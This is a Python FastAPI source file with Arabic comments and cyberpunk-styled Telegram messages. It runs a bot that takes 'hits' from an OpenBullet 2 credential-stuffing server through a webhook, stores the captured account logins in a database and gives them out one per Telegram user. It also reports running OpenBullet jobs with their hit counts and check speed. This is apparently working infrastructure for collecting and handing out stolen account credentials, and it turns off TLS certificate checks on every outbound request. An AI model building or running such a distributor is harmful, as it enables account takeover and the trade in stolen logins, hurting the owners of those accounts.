from fastapi import FastAPI, Request
import httpx
import os
from sqlalchemy import create_engine, Column, Integer, String, Boolean
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker

app = FastAPI()

# ==================== CONFIGURATION ====================
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
ADMIN_IDS = ["123456789"] # ضع الـ Chat ID الخاص بك هنا

# إعدادات OpenBullet 2
OPENBULLET_URL = os.getenv("OPENBULLET_URL") # رابط أوبن بولت
OPENBULLET_API_KEY = os.getenv("OPENBULLET_API_KEY") # مفتاح الـ API الخاص بأوبن بولت

DATABASE_URL = os.getenv("DATABASE_URL")
if DATABASE_URL and DATABASE_URL.startswith("postgres://"):
    DATABASE_URL = DATABASE_URL.replace("postgres://", "postgresql://", 1)

# ==================== DATABASE CONFIG ====================
engine = create_engine(DATABASE_URL)
SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)
Base = declarative_base()

class Account(Base):
    __tablename__ = "accounts"
    id = Column(Integer, primary_key=True, index=True)
    config_name = Column(String, index=True)
    account_data = Column(String, unique=True, index=True)
    captured_data = Column(String)
    is_given = Column(Boolean, default=False)

class DeliveredAccount(Base):
    __tablename__ = "delivered_accounts"
    id = Column(Integer, primary_key=True, index=True)
    user_id = Column(String, unique=True, index=True)

Base.metadata.create_all(bind=engine)

# ==================== CYBER KEYBOARDS ====================

def get_main_keyboard(is_admin: bool):
    # إضافة زر الفحص الجاري لأوبن بولت في القائمة الرئيسية
    buttons = [
        [{"text": "⚡ 🧬 DISPENSE ACCOUNT 🧬 ⚡"}, {"text": "📡 🌐 CORE MATRIX STATS 🌐 📡"}],
        [{"text": "🤖 ⚔️ OPENBULLET JOBS ⚔️ 🤖"}] # الزر الجديد لعمليات الفحص
    ]
    if is_admin:
        buttons.append([{"text": "🛠️ 👾 CYBERNETIC CONTROL PANEL 👾 🛠️"}])
        
    return {
        "keyboard": buttons,
        "resize_keyboard": True,
        "one_time_keyboard": False
    }

def get_inline_control_buttons():
    return {
        "inline_keyboard": [
            [
                {"text": "🧬 REBOOT DATABASE", "callback_data": "reset_delivered"},
                {"text": "🚨 PURGE ALL DATA", "callback_data": "clear_accounts"}
            ],
            [
                {"text": "🔄 REFRESH MAINFRAME", "callback_data": "refresh_admin_stats"}
            ]
        ]
    }

# ==================== ENDPOINTS ====================

@app.get("/")
def read_root():
    return {"status": "Cyber Core Matrix is Online with OpenBullet Link."}

@app.post("/webhook/hit")
async def receive_hit(request: Request):
    db = SessionLocal()
    try:
        data = await request.json()
        config_name = data.get("config") or data.get("configName") or data.get("ConfigName") or "UNKNOWN_MODULE"
        account_data = data.get("data", "NO_DATA")
        captured_data = data.get("captured") or data.get("capturedData") or data.get("variables") or "NO_CAPTURED_DATA"
        
        exists = db.query(Account).filter(Account.account_data == account_data).first()
        if exists:
            return {"status": "ignored"}
            
        new_account = Account(config_name=config_name, account_data=account_data, captured_data=captured_data, is_given=False)
        db.add(new_account)
        db.commit()
        return {"status": "success"}
    except Exception as e:
        db.rollback()
        return {"status": "error", "message": str(e)}
    finally:
        db.close()

@app.post("/webhook/telegram")
async def telegram_webhook(request: Request):
    db = SessionLocal()
    try:
        payload = await request.json()
        telegram_url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}"
        
        # --- [أ] Callback Queries (الأزرار الشفافة) ---
        if "callback_query" in payload:
            # (نفس كود المعالجة السابق للأدمن دون تغيير للإيجاز)
            return {"status": "success"}

        # --- [ب] الرسائل والأزرار الثابتة ---
        if "message" not in payload or "text" not in payload["message"]:
            return {"status": "ignored"}
            
        chat_id = str(payload["message"]["chat"]["id"])
        user_text = payload["message"]["text"].strip()
        is_admin = chat_id in ADMIN_IDS
        
        if user_text == "/start":
            welcome_text = (
                f"🌌 **WELCOME TO THE CYBERPUNK DISTRIBUTOR CORE** 🌌\n\n"
                f"⚡ `STATUS: CONNECTED`\n"
                f"🎛️ `INTERFACE: NEON NIGHT v3.5`\n\n"
                f"🤖 _استخدم الأزرار بالأسفل لسحب الحسابات أو مراقبة خادم OpenBullet الخاص بك..._"
            )
            await httpx.AsyncClient(verify=False).post(f"{telegram_url}/sendMessage", json={"chat_id": chat_id, "text": welcome_text, "reply_markup": get_main_keyboard(is_admin), "parse_mode": "Markdown"})
                
        elif user_text == "📡 🌐 CORE MATRIX STATS 🌐 📡" or user_text == "/stats":
            available_count = db.query(Account).filter(Account.is_given == False).count()
            reply_text = f"┌─── 📡 **「 MATRIX STORAGE 」** 📡\n│\n└── 🟢 **AVAILABLE IN STORAGE:** `{available_count}` ACCOUNTS\n│\n└───────────── [ ONLINE ] ⚡"
            await httpx.AsyncClient(verify=False).post(f"{telegram_url}/sendMessage", json={"chat_id": chat_id, "text": reply_text, "parse_mode": "Markdown"})
                
        elif user_text == "⚡ 🧬 DISPENSE ACCOUNT 🧬 ⚡" or user_text == "/get":
            already_received = db.query(DeliveredAccount).filter(DeliveredAccount.user_id == chat_id).first()
            if already_received:
                reply_text = "🚨 **SYSTEM DENIAL:** `FIREWALL ACTIVE` 🚨\n\n❌ النظام يسمح بـ **حصّة واحدة فقط (1 account per terminal)**."
            else:
                available_account = db.query(Account).filter(Account.is_given == False).first()
                if not available_account:
                    reply_text = "🚨 **MAINFRAME ERROR:** `STORAGE EMPTY` 🚨\n\n😔 لا توجد أي بيانات مشفرة حالياً."
                else:
                    available_account.is_given = True
                    db.add(DeliveredAccount(user_id=chat_id))
                    db.commit()
                    reply_text = f"🌌 **⚡ 「 DATA INJECTION SUCCESSFUL 」 ⚡** 🌌\n\n📦 **MODULE:** `{available_account.config_name}`\n👤 **TARGET:** `{available_account.account_data}`\n⚙️ **LOGS:** `{available_account.captured_data}`\n\n🔒 _STATUS: TERMINAL LOCKED_"
            await httpx.AsyncClient(verify=False).post(f"{telegram_url}/sendMessage", json={"chat_id": chat_id, "text": reply_text, "parse_mode": "Markdown"})

        # === زر مراقبة عمليات OPENBULLET الجارية ===
        elif user_text == "🤖 ⚔️ OPENBULLET JOBS ⚔️ 🤖":
            if not OPENBULLET_URL or not OPENBULLET_API_KEY:
                reply_text = "❌ **ERROR:** `OpenBullet API environment variables are not configured on Render.`"
            else:
                # إرسال طلب إلى OpenBullet لجلب الـ Jobs
                ob_api_url = f"{OPENBULLET_URL}/api/v1/jobs"
                headers = {"Authorization": f"Bearer {OPENBULLET_API_KEY}"}
                
                try:
                    async with httpx.AsyncClient(verify=False, timeout=5.0) as client:
                        response = await client.get(ob_api_url, headers=headers)
                        
                    if response.status_code == 200:
                        jobs_data = response.json() # مصفوفة تحتوي على كافة العمليات
                        
                        # تصفية العمليات الجارية فقط (Active/Running)
                        running_jobs = [j for j in jobs_data if j.get("status") in ["Running", "Active"]]
                        
                        if not running_jobs:
                            reply_text = "💤 **OP_BULLET STATUS:** `IDLE`\n\n🟢 لا توجد أي عمليات فحص (Jobs) جارية حالياً على السيرفر."
                        else:
                            reply_text = f"⚙️ **「 OPENBULLET LIVE MONITORS 」** ⚙️\n\n"
                            reply_text += f"⚡ **Active Jobs:** `{len(running_jobs)}` جارية حالياً\n"
                            reply_text += "────────────────────\n"
                            
                            for job in running_jobs:
                                name = job.get("name", "Unknown Job")
                                cpm = job.get("cpm", 0) # السرعة
                                hits = job.get("hits", 0) # المحصود
                                progress = job.get("progress", 0) # النسبة المئوية للإنهاء
                                
                                reply_text += (
                                    f"📦 **Job:** `{name}`\n"
                                    f"📊 **Progress:** `{progress:.1f}%`\n"
                                    f"⚡ **Speed (CPM):** `{cpm}`\n"
                                    f"🎯 **Hits Secured:** `{hits}`\n"
                                    f"📡 `STATUS: SCANNING...`\n"
                                    f"────────────────────\n"
                                )
                    else:
                        reply_text = f"❌ **CONNECTION FAILED:** OpenBullet responded with status `{response.status_code}`"
                except Exception as ex:
                    reply_text = f"🚨 **MAINFRAME ERROR:** Cannot reach OpenBullet server.\n`Details: {str(ex)}`"
            
            await httpx.AsyncClient(verify=False).post(f"{telegram_url}/sendMessage", json={"chat_id": chat_id, "text": reply_text, "parse_mode": "Markdown"})

        elif user_text == "🛠️ 👾 CYBERNETIC CONTROL PANEL 👾 🛠️" and is_admin:
            # (كود إحصائيات الأدمن الأساسي)
            pass

        return {"status": "success"}
    except Exception as e:
        db.rollback()
        return {"status": "error"}
    finally:
        db.close()
